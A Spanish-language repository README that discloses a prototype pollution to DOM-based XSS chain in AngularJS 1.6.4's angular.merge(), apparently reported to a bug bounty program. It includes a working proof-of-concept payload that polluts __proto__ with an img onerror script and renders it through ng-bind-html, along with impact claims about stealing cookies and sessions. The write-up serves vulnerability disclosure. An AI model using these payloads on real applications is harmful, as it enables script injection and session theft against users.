# Prototype-Pollution-Stored-XSS-via-AngularJS-1.6.4
Este repositorio documenta una vulnerabilidad client-side que combina **Prototype Pollution** y **DOM-Based XSS** en una aplicación que utiliza **AngularJS v1.6.4**. La vulnerabilidad fue identificada y reportada como parte de una investigación educativa.


# 🧨 Prototype Pollution → Stored XSS via AngularJS 1.6.4

Este repositorio documenta una vulnerabilidad client-side que combina **Prototype Pollution** y **DOM-Based XSS** en una aplicación que utiliza **AngularJS v1.6.4**. La vulnerabilidad fue identificada y reportada como parte de una investigación educativa.

---

## 📚 Descripción

AngularJS 1.6.4 es vulnerable a **Prototype Pollution** a través de la función `angular.merge()`. Cuando un atacante puede modificar `Object.prototype` con propiedades como `innerHTML`, y estas propiedades se usan en combinaciones con `ng-bind-html` y `$sce.trustAsHtml`, se puede escalar a una ejecución arbitraria de código JavaScript en el navegador de la víctima (**XSS**).

---

## ⚙️ Tecnología afectada

- Framework: **AngularJS v1.6.4**
- Función: `angular.merge()`
- CVE asociado: [CVE-2019-10768](https://nvd.nist.gov/vuln/detail/CVE-2019-10768)
- Tipo de vulnerabilidad: `Prototype Pollution → DOM-Based XSS`
- Clasificación CWE:
  - [CWE-1321: Prototype Pollution](https://cwe.mitre.org/data/definitions/1321.html)
  - [CWE-79: Cross-Site Scripting](https://cwe.mitre.org/data/definitions/79.html)

---

## 🧪 Prueba de Concepto

### Paso 1 – Contaminación del Prototipo

js
angular.merge({}, JSON.parse('{"__proto__":{"innerHTML":"<img src=x onerror=alert(1337)>","polluted":"yes"}}'));

console.log({}.polluted); // imprime "yes"

Paso 2 – Activación del Sink (ng-bind-html)

angular.element(document.body).injector().invoke(
  ['$compile', '$rootScope', '$sce', function($compile, $rootScope, $sce) {
    $rootScope.test = { innerHTML: $sce.trustAsHtml('<img src=x onerror=alert(1337)>') };
    const el = angular.element('<div ng-bind-html="test.innerHTML"></div>');
    document.body.appendChild(el[0]);
    $compile(el)($rootScope);
    $rootScope.$digest();
  }]
);


✅ Se ejecuta alert(1337) confirmando la ejecución de JavaScript inyectado.

 Impacto

    Tipo de XSS: DOM-Based XSS

    Vector de entrada actual: Consola del navegador (self-XSS)

    Impacto potencial:

        Robo de cookies o tokens

        Secuestro de sesiones

        Phishing interno o inyección persistente si se encuentra un vector externo

📊 CVSS

CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N
Base Score: 6.1 (Medium)

🔬 Posibilidades de explotación real

Actualmente el vector requiere acceso a consola (self-XSS). Sin embargo, si el atacante logra inyectar datos en algún punto donde se use angular.merge() (ej. parámetros, cookies, localStorage, APIs), esta vulnerabilidad puede escalar a:

    ✅ Stored XSS

    ✅ Reflected XSS

    ✅ Persistent client-side compromise

Se está investigando un vector de entrada automatizado.
📎 Reporte estilo HackerOne

Este hallazgo fue reportado al programa de recompensas de bugs de la NBA. La respuesta inicial lo clasificó como self-XSS, pero el exploit sigue siendo técnicamente válido como vulnerabilidad Prototype Pollution y demuestra un impacto potencial serio.

